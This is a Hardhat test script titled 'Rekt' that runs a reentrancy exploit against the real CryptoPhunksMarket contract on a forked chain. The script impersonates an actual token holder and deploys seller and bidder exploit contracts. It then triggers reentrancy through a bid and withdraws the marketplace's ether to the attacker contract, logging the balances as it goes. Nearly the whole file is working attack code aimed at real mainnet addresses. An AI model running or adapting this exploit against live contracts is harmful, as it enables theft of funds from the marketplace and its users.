const { ethers, network } = require("hardhat");

describe.only("Rekt", function () {
  it("Should exploit CryptoPhunks", async function () {

      const CryptoPhunksMarketAddress = "0x3a6aDb264C96258C70681DF32a80dA027baDAB5f"
      const CryptoPhunksAddress = "0xf07468eAd8cf26c752C676E43C814FEe9c8CF402"

      //pick random address with a phunk
      const phunkOwner = "0x8c4Ff43Aa018877818d2FDf070FC839B55e765FF"
      const phunkId = 2392

      const accounts = await ethers.getSigners();


      const CPM = await ethers.getContractAt("CryptoPhunksMarket", CryptoPhunksMarketAddress);
      const CP = await ethers.getContractAt("CryptoPhunksV2", CryptoPhunksAddress);


      const SellerExploitFactory = await ethers.getContractFactory("SellerExploit");
      const BidderExploitFactory = await ethers.getContractFactory("BidderExploit");

      //deploy seller contract
      const se = await SellerExploitFactory.deploy(CryptoPhunksMarketAddress, CryptoPhunksAddress);
      await se.deployed();
      //deploy buyer contract
      const be = await BidderExploitFactory.deploy(CryptoPhunksMarketAddress, se.address);
      await be.deployed();


      //send cryptophunk to seller contract
      await network.provider.request({
          method: "hardhat_impersonateAccount",
          params: [phunkOwner]
      })
      const phunkSigner = await ethers.provider.getSigner(phunkOwner);
      await hre.network.provider.request({
          method: "hardhat_setBalance",
          params: [phunkOwner, "0x1000000000000000000"]
       });
      await hre.network.provider.request({
          method: "hardhat_setBalance",
          params: [se.address, ethers.utils.parseEther("1").toHexString().replace("0x0", "0x")]
       });

      console.log("Current owner of Phunk: ", await CP.ownerOf(phunkId))
      console.log("Moving phunk to our seller exploit contract")
      await CP.connect(phunkSigner)["safeTransferFrom(address,address,uint256)"](phunkOwner, se.address, phunkId);
      console.log("Current owner of Phunk: ", await CP.ownerOf(phunkId))


      let CPMBalance = ethers.utils.formatEther(await ethers.provider.getBalance(CryptoPhunksMarketAddress));
      console.log("Current PhunkMarketPlace balance: ", CPMBalance);
      
      let sellerWithdrawals = ethers.utils.formatEther(await CPM.pendingWithdrawals(se.address));
      console.log("Amount the seller is allowed to withdraw: ", sellerWithdrawals)


      console.log("Place bid value...");
      be.exploit(phunkId, {value: ethers.utils.parseEther("1.0")})

      let bids = await CPM.phunkBids(phunkId);
      let bidsValue = ethers.utils.formatEther(bids.value);
      console.log("Current bid value: ", bidsValue);


      console.log("Exploiting reentrancy...")
      await se.exploit(phunkId, {gasLimit: 20000000})


      sellerWithdrawals = ethers.utils.formatEther(await CPM.pendingWithdrawals(se.address));
      console.log("Amount the seller is allowed to withdraw: ", sellerWithdrawals)


      let seBalance = ethers.utils.formatEther(await ethers.provider.getBalance(se.address));
      console.log("Balance of exploiter contract: ", seBalance)
      console.log("Withdrawing balance from market place...");
      await se.withdraw({gasLimit: 100000});
      seBalance = ethers.utils.formatEther(await ethers.provider.getBalance(se.address));
      console.log("Balance of exploiter contract: ", seBalance)

  });
});